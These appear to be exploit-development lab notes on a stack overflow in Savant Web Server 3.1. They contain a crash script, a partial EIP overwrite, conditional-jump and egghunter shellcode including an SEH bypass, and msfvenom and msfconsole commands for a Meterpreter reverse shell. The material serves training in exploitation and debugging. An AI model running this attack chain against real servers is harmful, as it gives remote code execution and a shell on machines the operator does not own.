Some exploits do not leave sufficient exploit space to write shellcode. However, it's sometimes possible to write code to other parts of program memory that can be referenced by the limited exploit space.
- Space Restrictions
- Bad Characters
- Partial Instruction Pointer Overwrite

# Savant Web Server 3.1 Exploit
First, we get the server to crash. (Pre-installed on Windows client). Reference https://www.cvedetails.com/cve/CVE-2002-1120/

### Cause a Crash
1. Attach WinDbg to a Savant process
2. Create and run a python exploit 
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
3. Trigger access violation, and immediately gaining EIP control

### Crash Analysis
Typically ESP points to our controlled buffer, where we can store shellcode, and would have a jump instruction like JMP ESP that would give us access to EIP
In this case, ESP points to our controlled buffer, but we only have 3 bytes for our shellcode.
> An attempt to increase the buffer size ends up changing the crash and losing EIP control

- The buffer is also null-byte terminated, meaning it is probably stored as a string (important).
- The 2nd DWORD on the stack points very close to our buffer (`03e0ea84` vs `03e0ea2c`)
- `dc` (dump with ASCII) on this address shows the GET request, some null bytes, then the A's

### Detect Bad Characters
Same process as usual, but in this exploit the program will not crash (not reach 260 bytes in length) if there is a bad char in the buffer. As a result, we should comment out blocks of lines and rerun to determine where the crash is happening (since we can view debugger output).
- Start with half, then narrow down to the line level, if there is a crash, then the uncommented lines are all good chars, else inspect char by char (tedious af)
- badchars = `0x00, 0x0A, 0x0D, 0x25`

# Gaining Code Execution
1. Determine exact offset of the EIP overwrite
	1. msf-pattern_create didn't work here due to changing the nature of the overflow... need to try manually (binary split search)
 2. Find an instruction to jump to with `.load narly` -> `!nmod`
 3. But we find that the only module included with the program is Savant itself, and it is preceded with a null byte, meaning it would break the exploit
### Partial EIP Overwrite
Remember how our value on the stack was null terminated? We can leverage that to reach Savant modules located in the 00XXXXXX range
1. Change script to only overwrite the first three bytes : `input buffer += b'\x60\x60\x60`, removing anything post EIP buffer as well
2. Locate an instruction in Savant code space that will jump to controllable overflow space.
	1. We don't have any space after our instruction on the stack (where ESP points), but the second value on the stack still points to the top of our input (the GET and subsequent overflow)
	2. This requires a POP 32, RET
	3. First we inspect the unassembled code at that address (the GET) to see if it will break the exploit, it does at `add byte ptr [eax],al` since EAX is the address 0x00000000.
	4. But, we can try to specifically pop the extra value from the stack into EAX to make it a valid address. (POP EAX, RET)
	5. `lm m savant` -> `s ADDR_START ADDR_END 58 C3`, using `msf-nasm_shell` to determine the opcodes 58 and C3 
	6. Input address of instruction into exploit code `inputBuffer += pack('<L', (ADDR_NO_0's))`
	7. `bp ADDR` : and test the new exploit, stepping through to ensure there are no access violation... but there is on a later `byte ptr [edi],ch` instruction :(

### Changing the HTTP Method
Taking a step back, we analyze the buffer where we are returning to, our HTTP GET, with `dc esp`. GET is post padded with a bunch of nulls up to a fixed length, showing that there is extra space to work with, but also suggesting that the HTTP method is never actually checked. 
We could place a short jump in its place to get to our buffer
- `nasm> jmp short XX` 
- Edit GET buffer in exploit with short jump opcode
- Set `bp`,  try the exploit, and `dc poi(@esp)` right before the return, (or just `t` through) but we realize that the jmp instruction was mangled and came in as `cb` instead of `eb`
> 	Even though we tested bad chars earlier, input can be checked and managed differently in the program depending on which section of memory you are writing to, in this case the HTTP method is checked differently

### Using Conditional Jump
Since the traditional short jump doesn't work, lets try a conditional jump instruction. For this specific case, we'll use JE (also called JZ) which checks the ZF flag. The ZF flag is the "zero flag" and will be set to 1 on a TEST instruction (and others) if the arithmetic being tested equals 0
- In reverse order, we need to jump if ZF is 1, test arithmetic to ensure ZF is 1, set a register to control our test conditions. An instruction flow that matches this would be : 
	- `xor ecx, ecx` : zero's out ECX (we could use any register)
	- `test ecx, ecx` : sets the ZF to 1
	- `je 0x15` : jumps 15 bytes if ZF
1. Run this through `msf-nasm_shell` and check for any bad characters, we see none except the nulls at the end of the jump. This isn't a problem though since the program will append null bytes for us anyway, so we can just leave them off.
2. Put into exploit script : `b'\x31\xc9\x85\xc9\x0f\x84\x0f + ' /'`. Be SURE to include the space before the '/' as this denotes the end of what would be the GET request
3. `bp` at the return instruction and run again, `u poi(@esp)` before the return to check if the instructions loaded correctly, and `r @zf` before the jump to ensure the condition is right
4. Take the jump and `u @eip` to ensure we ended up in the buffer space
5. `db @eip L100` -> `? FINAL_ROW_ADDR + LAST_CHAR_HEX_OFFSET - @eip` : which returns the amount of space for shellcode, in this case 251

# Egghunting (Finding Alternative Buffers)
Since 251 bytes is not enough for a robust shellcode, we look into ways to extend the buffer sent to the application
- Attempt 1, sending a large buffer in the body of the HTTP request (ie. add buffer after a `/r/n` then follow it with a `/r/n/r/n`.). This fails and the application doesn't crash or the crash changes.
- Attempt 2, send a large buffer after the HTTP request (after a `/r/n/r/n`), this succeeds, but it ends up somewhere besides our controllable stack. This is workable.
With this buffer, we prepend an identifiable string, an "egg", that we can then search the program memory space with `s -a 0x0 L?80000000 babu_was_here` 

### The Heap
- The address returned by the egg is not in our current stack. Its on the heap, as seen with `!address ADDRESS` extension in WinDbg
Processes can request heap space through the Windows heap manager by use of API calls like HeapAlloc, HeapFree, etc. These then call into native Windows function in `ntdll.dll`.
All processes get a new "Default Process Heap" at start, but new heaps can be requested by the process at runtime (through the heap API or with C calls malloc / free). This implementation is called NT Heap.
The heap is all dynamically allocated memory, so **our buffer space cannot be determined before run time**

### Egghunter
Egghunter : a stage one payload that searches for a static string (the egg) in Virtual Address Space (VAS), then jumps to that address.
Egghunters must be small to fit as a stage 1, fast to prevent process hanging, and robust to handle access violations. 
One way to build egghunter logic is to write the assembly, compile it, then open the program in IDA to get the opcodes. But this is tedious when constant corrections are needed. 

### Keystone Engine
Now introducing <u><b>the Keystone Engine</b></u> : an assembler framework allowing us to write assembly code in a python script (or other language) and have it compile directly to machine code.
Install instructions here: https://github.com/keystone-engine/keystone/blob/master/docs/COMPILE-NIX.md
https://www.keystone-engine.org/docs/
terminal usage: `kstool x32 "add eax, ebx"`
python usage:
```
from keystone import *
CODE = (
	"start:
		xor eax, eax;
		...
		pop esi;"
)
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
# \\x{0:02x} -> print '\x' literally, followed by a 0 pre-padded, 2 digit width, hex value
for dec in encoding:
	instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print("Opcodes = (\"" + instructions + "\")")
```
[[LESSON]] : don't name your file `keystone.py` as this is the library name...
After producing shellcode with one of these tools, it can be verified with msf-nasm_shell


### Egghunter Example
`NTAccessCheckAndAuditAlarms` : a Windows system call that we abuse to check for access violations and handle cleanly using native Windows kernel methods. Returns either `STATUS_ACCESS_VIOLATION` if invalid or `STATUS_NO_IMPERSONATION_TOKEN` if valid
[[Egghunter Example]]
1. Edit the egghunter example to include out custom egg
2. Run the script to get the opcodes and insert into our exploit script. It fits after the HTTP request, where we set our conditional jump to. Prepend the script with nops to mitigate imprecisions.
3. Set a breakpoint on the EIP jump address, then step through to ensure that the egghunter code wasn't mangled
4. `s -a 0x0 L?80000000 "BabuBabu"` to ensure the egg and buffer are in memory, then set a breakpoint on the last instruction (the `jmp edi`) to signify when the egghunter is done.
5. `g` to let code run, but the breakpoint is never hit... We also see that Savant CPU usage is very high, meaning its still searching
Some research shows that this code is primarily a Windows 7 exploit, signifying that something changed between Windows 7 and Windows 10 that causes this exploit to fail...


### Debugging the Egghunter
Through some Googling, we see that the syscall number changed in Windows 10, and changes in every version after. https://j00ru.vexillium.org/syscalls/nt/32/
1. Get current version of Windows (About PC shows 1709)
	- We can't just add the new one because there are null bytes
2. Edit the egghunter.py script to product the correct syscall
	1. Find the Two's Compliment (calculated via WinDbg `? 0x00 - 0x01c6`) 
	2. Then negate it with `neg eax` to get back the original value
3. Run and add a breakpoint at the `jmp edi` to see that it finds the egg in memory

### Egghunter Shellcode
Remember that this is a new buffer and so we need to check again for bad characters.
Since our exploit is stable without the shellcode section, we can send all the potential badchars at once (as it won't break the exploit), then dump that region of memory in WinDbg by searching for the egg. 
1. Insert string of all chars into script.
2. `db EGG_ADDRESS+8 L100` : assuming egg length of 8 chars, and L100 being 256 (16x16) in hex for all the entered chars. 
	   It seems like all the chars came in good.
3. Generate shellcode `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8005 -f python -v shellcode` : where v is the variable name to be set in python and put it in the script
4. Run a listener `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"`
5. Run Savant without the debugger, then throw the exploit script
6. Boom, reverse shell

# Egghunter Portability
Because syscall numbers change, we want to find an egghunter workaround that is more portable to different versions of Windows. The option here is to create our very own SEH mechanism embedded in the egghunter, with the trade-off of increasing its size from (35 to 60 bytes).

[[Egghunter SEH Example]]

- `python egghunter_seh_example.py` to generate opcodes and replace them in the script.
- Set up WinDbg and Savant, set a breakpoint `bp 00418674` and step through to follow egghunter execution
- Once we inject the exception handler, set a breakpoint at the handler address and continue execution to see how our read at 0x00000000 is handled.
	- But this never happens, every time we continue execution we get an access violation on the same `repe scasd` instruction...

### Identifying the issue in SEH
Using static-dynamic analysis (IDA/Ghidra + Windbg)
- Copy over ntdll.dll from the target box to the dev environment with something like : `[convert]::ToBase64String((Get-Content -path "C:\Windows\system32" -Encoding byte))`, then reference [[notepad.exe transfer]]
- `bp ntdll!RtlDispatchException`, after our access violation
1. Stepping through the RtlDispatchException code flow in the disassembler, we notice a call to RtlpGetStackLimits which tips us off that there might be a check on where the exception handler resides in memory
2. Before the call are two `lea` instructions that store addresses in edx and ecx, which will be the addresses that store the return values of StackBase and StackLimit from the function.
	1. Jump into the function to confirm that is whats happening
3. We search the RtlDispatchException code and find these addresses are used again later, and moved into edi (as StackLimit) and ebx (as StackBase). Following this are checks and a unique call to RtlIsValidHandler (only one in RtlDispatchException), meaning that these checks must pass in order for the exception handler to be used. 
4. Set a breakpoint at this first check, `cmp ecx, edi`, to jump ahead and check these. This also confirms that there are no errors preceding this code block.
5. Analyzing these checks:
	- `cmp ecx,edi` - start address of ERR (`_EXCEPTION_REGISTRATION_RECORD`) must be higher than StackLimit 
	- `cmp eax,ebx` - (preceded by `lea eax, [ecx+8]`), end address of ERR must be lower than StackBase
	- `test cl,3` - address of ERR must be aligned to the four byte memory boundary 
	- `cmp ecx,ebx` - (preceded by `ecx, dword ptr [ecx+4]`) address of the exception hander functions must be higher than StackBase or lower than StackLimit (off the stack). 
	> **Our code fails the last check**

![[SEH Stack Drawing.jpg]]

Since there is no other compile time protections, once we pass these checks, the exploit should be good to go.

### Overcoming the SEH issue
We can overwrite the StackBase as part of our egghunter so that our exception_handler appears to be after it (seeming as if its off the stack) and keep the ERR on the stack. This is done by overwriting the StackBase value with an address arbitrarily (?) less than the exception_handler pointer, but still greater than the ERR that we pushed onto the stack.

The code below is a modification to [[Egghunter SEH Example]]
```
build_exception_record:
	...
	# where ecx is the address of the exception_handler function
	# zero out ebx
	xor ebx, ebx
	# move the top stack addr (currently the ERR) into the TEB's ExceptionList
	mov dword ptr fs:[ebx], esp
	# set a value 4 below the except_handler addr to be used as the new StackBase
	sub ecx, 0x04
	# prepare the proper offset to the TEB's StackBase (+4)
	add ebx, 0x04
	# move the new addr (4 before except_handler) into the TEB's StackBase
	mov dword ptr fs:[ebx], ecx
```

- Generate the shellcode and input it into the exploit
- breakpoint at EIP control point, run the exploit, and step through until the end of build_exception_record
- With `!teb` and `dt _EXCEPTION_REGISTRATION_RECORD XXXXXXXX` to verify values like ExceptionList, StackBase, and Handler are all the expected values
- Run the program to trigger the access violation, `!exchain`, and breakpoint at the exception_handler address
- Step through and use `dt _CONTEXT @eax` to check eip in the ContextRecord, and `u EIP_ADDR` to verify this points to the `scas` instruction initiating the error. Repeat this on the next step (the `add... 0x06`) to ensure the eip now points to the code in loop_inc_page
- `bc *` to clear breakpoints, `sxd av` to skip first chance exceptions, and `sxd gp` to disable guard pages
- Set up the meterpreter listener and let the exploit run
- Shell